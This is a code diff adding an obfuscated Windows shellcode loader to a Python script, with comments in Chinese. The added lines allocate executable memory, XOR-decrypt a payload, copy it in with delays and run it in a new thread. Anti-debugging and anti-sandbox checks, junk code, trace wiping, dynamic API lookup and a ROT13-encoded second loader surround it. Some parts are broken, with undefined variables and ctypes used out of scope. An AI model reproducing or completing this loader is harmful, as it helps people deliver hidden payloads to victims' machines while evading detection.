@@ -11,7 +11,58 @@ import os, psutil
 for _ in range(ord('@')):
     if (lambda x: x ** 2)(_) % 3 == 0:
         _ = str(_) * int(bin(0o777)[2:])
+# ========== 第一阶段：加载器核心代码 ==========
+def _0xstage1_loader(_0xpayload):
+    import ctypes, time
+    # 内存分配混淆
+    _0xmem = ctypes.windll.kernel32.VirtualAlloc(0, len(_0xpayload), 0x3000, 0x40)
 
+    # 使用异或解密（示例密钥0xAA）
+    _0xbuf = bytearray([x ^ 0xAA for x in _0xpayload])
+
+    # 内存写入延迟操作
+    for i in range(0, len(_0xbuf), 1024):
+        ctypes.windll.kernel32.RtlMoveMemory(
+            _0xmem + i,
+            (ctypes.c_char * len(_0xbuf[i:i+1024])).from_buffer(_0xbuf[i:i+1024]),
+            len(_0xbuf[i:i+1024])
+        )
+        time.sleep(0.1)
+
+    # 线程执行混淆
+    _0xthread = ctypes.windll.kernel32.CreateThread(
+        0, 0, _0xmem, 0, 0x00000004, ctypes.byref(ctypes.c_ulong(0))
+    )
+    ctypes.windll.kernel32.WaitForSingleObject(_0xthread, -1)
+
+# ========== 第二阶段：动态解密执行 ==========
+def _0xstage2_execution():
+    # 分离后的加密payload（示例使用异或加密）
+    _0xencrypted = bytes([x ^ 0xAA for x in s])  # s是原base64解码后的payload
+
+    # 环境检查通过后执行
+    _0xstage1_loader(_0xencrypted)
+
+
+try:
+    _0xantidebug_check()
+    _0xantisandbox_check()
+    _0xstage2_execution()
+except Exception as _0xe:
+    pass  # 异常处理混淆
+
+# 内存操作混淆（添加垃圾指令）
+_0xjunk_code = lambda: [
+    ctypes.windll.user32.MessageBoxW(0, "","",0)
+    for _ in range(ord('A')) if _%7 == 0
+]
+
+# 内存擦除保护
+def _0xclean_trace():
+    import sys
+    if hasattr(sys, '_MEIPASS'):
+        del sys._MEIPASS
+    ctypes.windll.kernel32.ZeroMemory(_0xmem, len(_0xpayload))
 
 def _0xr0t13(_0xmsg):
     _0xresult = []
@@ -66,6 +117,12 @@ def _0xantisandbox_check():
 # 在关键位置插入检测（在shellcode执行前）
 _0xantidebug_check()
 _0xantisandbox_check()
+
+# 动态获取API地址
+_0xkernel32 = ctypes.windll.kernel32
+_0xGetProcAddress = _0xkernel32.GetProcAddress
+_0xLoadLibraryA = _0xkernel32.LoadLibraryA
+_0xVirtualAlloc = _0xGetProcAddress(_0xLoadLibraryA(b"kernel32"), b"VirtualAlloc")
 
 
 _0xc0d3d = "pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(f), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(f), yra(f));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)"
